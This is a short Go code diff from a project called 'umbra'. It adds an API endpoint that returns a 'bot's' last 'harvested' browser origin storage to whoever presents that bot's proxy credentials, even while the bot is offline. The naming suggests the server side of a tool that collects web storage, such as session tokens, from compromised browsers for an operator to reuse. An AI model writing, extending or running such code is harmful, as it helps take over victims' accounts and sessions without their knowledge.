@@ -7,6 +7,8 @@ import (
 	"time"
 
 	"gorm.io/gorm"
+
+	"github.com/s045pd/umbra/internal/db/models"
 )
 
 // ProxyCredsAPI exposes endpoints used by *external* tools (the Chrome
@@ -109,6 +111,26 @@ func (a *ProxyCredsAPI) GetBotBrowserState(w http.ResponseWriter, r *http.Reques
 		out[category] = payload[category]
 	}
 	JSONOK(w, out)
+}
+
+// GetBotPageStorage is POST /api/v1/get-bot-page-storage
+// Returns the last harvested origin storage, including when the bot is offline.
+func (a *ProxyCredsAPI) GetBotPageStorage(w http.ResponseWriter, r *http.Request) {
+	var body proxyCredReq
+	if !MustDecode(w, r, &body) {
+		return
+	}
+	bot, err := findBotByCredentials(a.DB, body.Username, body.Password)
+	if err != nil {
+		JSONErr(w, http.StatusUnauthorized, "invalid proxy credentials")
+		return
+	}
+	var row models.BotPageStorage
+	if err := a.DB.Where("bot_id = ?", bot.ID).First(&row).Error; err != nil {
+		JSONOK(w, map[string]any{"origins": []any{}, "captured_at": nil})
+		return
+	}
+	JSONOK(w, map[string]any{"origins": row.Origins, "captured_at": row.CapturedAt})
 }
 
 func (a *ProxyCredsAPI) fetchVia(w http.ResponseWriter, r *http.Request, action, resultKey string, data map[string]any) {
